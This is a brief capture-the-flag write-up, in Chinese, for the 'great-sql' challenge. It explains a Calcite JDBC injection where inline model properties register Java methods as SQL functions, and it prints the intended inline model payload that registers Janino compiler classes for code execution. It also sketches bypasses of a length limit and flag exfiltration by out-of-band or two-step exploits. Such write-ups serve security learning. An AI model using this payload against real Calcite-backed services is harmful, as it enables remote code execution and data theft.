## great-sql
## Description
Where is sqlMaster?

## Author
GSBP

## solutions

漏洞原因是`jdbc:calcite:`下可以注入任意的inline属性，而inline属性可以支持将java方法注册进入sql方法。形成了一个UDF漏洞。预期解法使用了下面两个inline model来注册方法。
```java
MODEL = (
    "inline:{version:1,schemas:[{name:0,functions:["
    "{className:'org.codehaus.commons.compiler.samples.DemoBase',methodName:'*'},"
    "{className:'org.codehaus.janino.ClassBodyEvaluator',methodName:'*'}"
    "]}]}"
)
```

长度限制有很多种方法可以绕过，看了解题队伍的wp发现我这个长度设的还是太宽了XD，有以下的方法

- 缩短inline model的长度
- 多次打入payload
- 改变原生的json结构，删掉不必要的属性
...

然后预期解中使用了OOB来带出flag，不过也有其他队伍通过两次exploit:第一次执行`/readflag`并将结果转移到可读文件中,第二次通过注册文件读取函数来读取flag结果
